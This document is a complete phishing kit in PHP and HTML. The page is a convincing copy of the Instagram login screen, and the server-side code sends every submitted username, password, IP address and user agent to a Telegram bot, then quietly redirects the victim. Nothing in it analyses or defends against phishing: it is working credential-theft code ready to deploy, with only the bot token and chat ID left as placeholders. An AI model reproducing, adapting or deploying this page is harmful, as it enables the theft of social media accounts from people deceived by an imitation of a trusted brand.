<?php
$redirect_url = "success.html";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    $username = $_POST['username'];
    $password = $_POST['password'];

    
    $ipAddress = $_SERVER['REMOTE_ADDR'];
    $userAgent = $_SERVER['HTTP_USER_AGENT'];

    
    $telegramBotToken = 'BOT_TOKEN';
    $chatID = 'CHAT_ID';
    $message = "Login Attempt:\nUsername/Email/Phone: $username\nPassword: $password\nIP Address: $ipAddress\nUser Agent: $userAgent";

    
    file_get_contents("https://api.telegram.org/bot{$telegramBotToken}/sendMessage?chat_id={$chatID}&text=".urlencode($message));

    
    $is_authenticated = true;

    if ($is_authenticated) {
        
        echo "<script>
            setTimeout(function() {
                window.location.href = '{$redirect_url}';
            }, 0);
        </script>";
    }
}
?>


<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login Form</title>
  <style>
    
    body, h1, h2, h3, p, button, input {
      margin: 0;
      padding: 0;
      border: none;
      font-family: Arial, sans-serif;
    }

    
    .container {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      background-color: #fafafa;
    }

    .logo {
      width: 200px;
      height: 120px; 
      margin-bottom: 30px;
    }

    
    .login-form {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 300px;
      padding: 20px;
      background-color: #fff;
      border: 1px solid #ddd;
      border-radius: 5px;
    }

    
    .login-input {
      width: 92%;
      padding: 10px;
      margin: 5px 0;
      border: 1px solid #ccc;
      border-radius: 3px;
    }

    
    .login-button {
      width: 100px;
      
      padding: 10px;
      margin: 10px 0;
      margin-left: 100px;
      background-color: #3897f0;
      color: #fff;
      border: none;
      border-radius: 3px;
      cursor: pointer;
    }

    .login-button:hover {
      background-color: #3367d6;
    }

    
    .social-button {
     width: 100%;
     padding: 10px;
     margin: 10px 0; 
     background-color: #f5f6f9;
     color: #000;
     border: none;
     border-radius: 3px;
     cursor: pointer;
   }

   .social-button img {
     width: 20px;
     height: 20px;
     margin-right: 20px;
   }

   
   .social-button span {
     margin-left: 70px;
   }


    
    .other-links {
      margin-top: 20px;
      font-size: 14px;
      color: #999;
    }

    .other-links a {
      color: #003569;
      text-decoration: none;
    }

    .other-links a:hover {
      text-decoration: underline;
    }

    
    .app-download {
      display: flex;
      align-items: center;
      margin-top: 20px;
    }

    .app-download img {
      width: 70px;
      height: 30px;
      margin-right: 10px;
    }

    .app-download a {
      color: #000;
      text-decoration: none;
    }

    .app-download a:first-child {
      margin-right: 20px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="https://www.linkpicture.com/q/Instagram-Logo-2010-2013-2.png" alt="Instagram">
    </div>
    <div class="login-form">
      <form action="login.php" method="post">
        <input class="login-input" type="text" name="username" placeholder="Phone number, username, or email address">
        <input class="login-input" type="password" name="password" placeholder="Password">
        <button type="submit" class="login-button">Log in</button>
      </form>
      <div class="social-button">
        <span>Log in with Facebook</span>
      </div>
    </div>
    <div class="other-links">
      <a href="/accounts/password/reset/">Forgotten your password?</a>
    </div>
    <div class="app-download">
      <a href="https://l.instagram.com/?u=https%3A%2F%2Fplay.google.com%2Fstore%2Fapps%2Fdetails%3Fid%3Dcom.instagram.android%26referrer%3Dig_mid%253D747B6EA7-361D-4F19-A7B5-4629CA6D2620%2526utm_campaign%253DloginPage%2526utm_content%253Dlo%2526utm_source%253Dinstagramweb%2526utm_medium%253Dbadge&amp;e=AT3tJCRQ1VaIJFbOgJATb5JlFkNwm9cD38s1mPSsw4dySRrczRrV2MYrok-rYKjHKpnWe_ipJs54qOrsN4TJFZDKJtdrP7JFt4WwCeHQN5YsYVmO_RYayC8vdgaGHo9KqgyF8HOgCaGdux7Jyu7l7g" target="_blank">
        <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Get it on Google Play">
      </a>
      <a href="ms-windows-store://pdp/?productid=9nblggh5l9xt&amp;referrer=appbadge&amp;source=www.instagram.com&amp;mode=mini&amp;pos=-8%2C-8%2C1936%2C1168" target="_blank">
        <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Get it from Microsoft">
      </a>
    </div>
  </div>
</body>
</html>
